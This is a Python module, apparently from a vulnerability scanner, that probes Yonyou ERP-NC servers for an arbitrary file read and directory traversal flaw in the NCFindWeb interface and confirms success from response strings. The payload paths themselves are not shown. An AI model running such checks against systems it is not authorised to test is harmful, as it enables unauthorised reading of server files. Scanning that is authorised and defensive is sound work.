#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool.logger import logger
from thirdparty import requests

def nc_fileRead_scan(self, url):
    ''' 用友ERP-NC NCFindWeb接口任意文件读取/下载漏洞
            也可以目录遍历
    '''
    vul_info = {}
    vul_info['app_name'] = self.app_name + 'ERP-NC'
    vul_info['vul_type'] = 'FileRead'
    vul_info['vul_id'] = 'NC-fileRead'
    vul_info['vul_method'] = 'GET'
    vul_info['headers'] = {}

    headers = self.headers
    headers.update(vul_info['headers'])

    for payload in self.yonyou_nc_fileRead_payloads:# * Payload
        path = payload['path']                      # * Path
        data = payload['data']                      # * Data
        target = url + path                         # * Target

        vul_info['path'] = path
        vul_info['data'] = data
        vul_info['target'] = target

        try:
            res = requests.get(
                target, 
                timeout=self.timeout, 
                headers=headers, 
                data=data, 
                proxies=self.proxies, 
                verify=False
            )
            logger.logging(vul_info, res.status_code, res)                        # * LOG

            if (('nc.bs.framework.server' in res.text) or ('WebApplicationStartupHook' in res.text)):
                results = {
                    'Target': target,
                    'Type': [vul_info['vul_type'], vul_info['app_name'], vul_info['vul_id']],
                    'Method': vul_info['vul_method'],
                    'Payload': {
                        'Url': url,
                        'Path': path
                    }
                }
                return results
        except requests.ConnectTimeout:
            logger.logging(vul_info, 'Timeout')
            return None
        except requests.ConnectionError:
            logger.logging(vul_info, 'Faild')
            return None
        except:
            logger.logging(vul_info, 'Error')
            return None
